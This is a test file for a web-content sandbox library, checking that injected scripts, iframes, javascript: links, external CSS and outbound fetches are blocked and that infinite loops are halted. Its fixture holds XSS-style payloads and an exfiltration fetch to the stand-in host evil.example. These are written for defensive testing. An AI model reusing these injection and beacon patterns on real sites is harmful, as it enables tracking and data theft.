import { describe, it, expect, beforeEach } from 'vitest';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { mountSoftNContainer } from '../src/index';

const PKG_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const LITE_WASM = path.join(PKG_ROOT, 'dist', 'runtime', 'engines', 'zipp-javascript-lite.wasm');

function flushAsync(ms = 35): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

describe('Container Sandbox Security, Egress Enforcement & Instruction Limits', () => {
  beforeEach(() => {
    localStorage.clear();
    document.body.innerHTML = '';
  });

  it('strips <script>/<iframe>/javascript:/external CSS urls and blocks dynamic script/iframe injection', async () => {
    (globalThis as Record<string, unknown>).__HOST_PWNED__ = false;

    const host = document.createElement('div');
    document.body.appendChild(host);

    const handle = await mountSoftNContainer(host, {
      isolation: 'inline',
      engineWasm: { lite: LITE_WASM },
      source: {
        'index.html': `<!DOCTYPE html>
          <html>
          <head>
            <style>
              @import url("https://evil.example/steal.css");
              .leak { background-image: url("https://evil.example/beacon.png"); }
            </style>
          </head>
          <body>
            <iframe src="https://evil.example/frame"></iframe>
            <img id="bad-img" src="https://evil.example/track.png" onerror="window.__HOST_PWNED__ = true">
            <a id="bad-link" href="javascript:window.__HOST_PWNED__=true">Click</a>
            <div id="out"></div>
            <script>
              // Attempt to escape or inject <script> and <iframe> dynamically
              const s = document.createElement('script');
              s.textContent = 'window.__HOST_PWNED__ = true';
              document.body.appendChild(s);

              const f = document.createElement('iframe');
              f.src = 'https://evil.example';
              document.body.appendChild(f);

              // Attempt to read host secret or make unpermitted external fetch
              fetch('https://evil.example/exfil')
                .then(() => { document.getElementById('out').textContent = 'ALLOWED_BAD'; })
                .catch(() => { document.getElementById('out').textContent = 'BLOCKED_OK'; });
            </script>
          </body></html>`,
      },
    });

    await flushAsync(50);

    // Zero <script> or <iframe> elements exist in the host ShadowRoot
    expect(handle.shadowRoot.querySelector('script')).toBeNull();
    expect(handle.shadowRoot.querySelector('iframe')).toBeNull();
    expect((globalThis as Record<string, unknown>).__HOST_PWNED__).toBe(false);

    // Unpermitted remote image & javascript: href stripped
    expect(handle.shadowRoot.querySelector('#bad-img')?.getAttribute('src')).toBeNull();
    expect(handle.shadowRoot.querySelector('#bad-img')?.getAttribute('onerror')).toBeNull();
    expect(handle.shadowRoot.querySelector('#bad-link')?.getAttribute('href')).toBeNull();

    // CSS @import & external url() neutralized
    const cssText = handle.shadowRoot.querySelector('style')?.textContent ?? '';
    expect(cssText).not.toContain('evil.example');

    // External fetch rejected cleanly
    expect(handle.shadowRoot.querySelector('#out')?.textContent).toBe('BLOCKED_OK');

    handle.dispose();
  });

  it('halts runaway infinite loops via ZIPP instruction budget without freezing', async () => {
    const host = document.createElement('div');
    document.body.appendChild(host);

    const errors: Error[] = [];
    await expect(
      mountSoftNContainer(host, {
        isolation: 'inline',
        engineWasm: { lite: LITE_WASM },
        limits: { instructionsPerTurn: 200_000 },
        onError: (e) => errors.push(e),
        source: {
          'index.html': `<!DOCTYPE html>
            <html><body>
              <script>
                while (true) {}
              </script>
            </body></html>`,
        },
      })
    ).rejects.toThrow();

    expect(errors.length).toBeGreaterThan(0);
  });
});
